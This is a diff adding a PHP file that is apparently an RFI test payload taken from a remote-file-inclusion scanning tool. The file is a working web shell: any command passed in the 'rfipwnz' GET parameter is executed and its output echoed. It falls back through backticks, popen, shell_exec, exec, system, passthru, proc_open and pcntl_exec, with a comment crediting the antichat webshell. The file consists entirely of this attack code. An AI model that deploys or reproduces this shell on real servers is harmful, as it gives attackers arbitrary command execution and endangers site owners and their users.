@@ -1,0 +1,100 @@
+<?
+/*
+ This file is used by this tool:
+ If you found it in your logs, just check if your website is vulnerable
+*/
+
+echo "fun"."ciona\n".shell($_GET['rfipwnz'], false);
+
+
+/* ejecuta comandos */
+function shell($cmd, $array = true){
+    if (!empty($cmd)){
+        if (`echo a`){ $salida[]=(`$cmd`); $salida[]='Modo: `$cmd`';}
+        
+        elseif (shellpopen('echo a')){$salida[]=shellpopen($cmd); $salida[]='Modo: popen($cmd)';}
+        
+        elseif (shell_exec('echo a')){$salida[]=shell_exec($cmd); $salida[]='Modo: shell_exec($cmd)';}
+        
+        elseif (exec('echo a')){$salida[]=exec($cmd); $salida[]='Modo: exec($cmd)';}
+        
+        elseif (systemreturn('echo a')){$salida[]=systemreturn($cmd); $salida[]='Modo: system($cmd)';}
+        
+        elseif (passthrureturn('echo a')){$salida[]=passthrureturn($cmd); $salida[]='Modo: passthru($cmd)';}
+       
+        elseif (shellprocopen('echo a')){$salida[]=shellprocopen($cmd); $salida[]='Modo: proc_open($cmd)';}
+       
+        elseif (shellpcntl('echo a')){$salida[]=shellpcntl($cmd); $salida[]='Modo: pcntl_exec($cmd)';}
+        
+        if ($array){
+            return $salida;
+        }else{
+            return $salida[0];
+        }
+    }else{
+        return false;
+    }
+}
+function shellpopen($cmd){
+/* fuente: antichat webshell v1.3 */
+  if($fp = popen($cmd,'r')){ 
+    $result = '';
+    while(!feof($fp)){$result.=fread($fp,1024);}
+    pclose($fp);
+  
+    $ret = $result;
+    $ret = convert_cyr_string($ret,'d','w');
+    return $ret;
+  }else{
+    return false;
+  }
+}
+function systemreturn($cmd){
+    ob_flush();
+    ob_start();
+        system($cmd);
+        $salida = ob_get_clean();
+    ob_end_clean();
+    return $salida;
+}
+function passthrureturn($cmd){
+    ob_flush();
+    ob_start();
+        passthru($cmd);
+        $salida = ob_get_clean();
+    ob_end_clean();
+    return $salida;
+}
+function shellprocopen($cmd){
+    $descriptorspec = array(
+       0 => array('pipe', 'r'), 
+       1 => array('pipe', 'w'), 
+       2 => array('pipe', 'w') 
+    );
+   
+    $process = proc_open($cmd, $descriptorspec, $pipes);
+    
+    if (is_resource($process)) {    
+        fclose($pipes[0]);
+        $salida = stream_get_contents($pipes[1]);
+        fclose($pipes[1]);
+        fclose($pipes[2]);
+        $return_value = proc_close($process);
+        return $salida;
+    }else{
+        return false;
+    }
+}
+function shellpcntl($cmd){
+    if(!function_exists('pcntl_exec')){
+        return false;
+    }
+    $args = explode(' ',$cmd);
+    $path = $args[0];
+    unset($args[0]);
+    if(pcntl_exec($path,$args)===false){
+        return false;
+    }else{
+        return 'El comando fue ejecutado, pero no se pudo recuperar la salida';
+    }
+}
